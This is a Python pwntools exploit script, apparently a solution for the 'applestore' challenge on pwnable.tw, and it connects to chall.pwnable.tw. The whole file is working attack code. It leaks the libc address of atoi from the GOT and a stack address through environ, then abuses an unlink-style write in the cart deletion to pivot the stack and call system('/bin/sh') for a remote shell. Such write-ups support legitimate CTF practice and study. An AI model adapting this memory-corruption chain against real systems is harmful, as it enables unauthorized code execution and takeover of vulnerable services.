from pwn import *

local=0
if local:
	p = process('./applestore')
	elf = ELF('./applestore')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	context.log_level = 'debug' 
else:
	p = remote('chall.pwnable.tw', 10104)
	elf = ELF('./applestore')
	libc = ELF('./libc_32.so.6')

def insert(n):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("> ")
    p.sendline(n)
    p.recvuntil("idea.\n")
def delete(n):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("> ")
    p.sendline(n)
def checkout():
    p.recvuntil("> ")
    p.sendline("5")
    p.recvuntil("> ")
    p.sendline("y")
    p.recvuntil("time!\n")
def cart(n):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("> ")
    p.sendline("y\x00" + p32(n) + p32(0)*3)
    p.recvuntil("27: ")

atoi_got_addr = elf.got["atoi"]

for i in range(6):
    insert("1")
for i in range(20):
    insert("2")
checkout()

cart(atoi_got_addr)
atoi_addr = u32(p.recvuntil("\n")[:4])
print "%x"%atoi_addr
libc.address = atoi_addr - libc.symbols['atoi']
environ_bss = libc.symbols['environ']
cart(environ_bss)
environ_addr = u32(p.recvuntil("\n")[:4])
system_addr = libc.symbols['system']
binsh_addr = libc.search('/bin/sh\x00').next()
ebp_addr = environ_addr - 0x100
ebp_new_addr = ebp_addr - 0xc
handle_ebp_addr = ebp_new_addr+0x48
nptr_addr=handle_ebp_addr-0x22
newstack = nptr_addr+2
print "%x"%ebp_addr

p.recvuntil("> ")
p.sendline("3")
#gdb.attach(p)
p.recvuntil("> ")
p.sendline("27" + p32(0) + p32(0) + p32(newstack) + p32(handle_ebp_addr-8))
p.recvuntil("> ")
p.sendline("06"+p32(0xdeadbeef)+p32(system_addr)+p32(nptr_addr)+p32(binsh_addr))
p.interactive()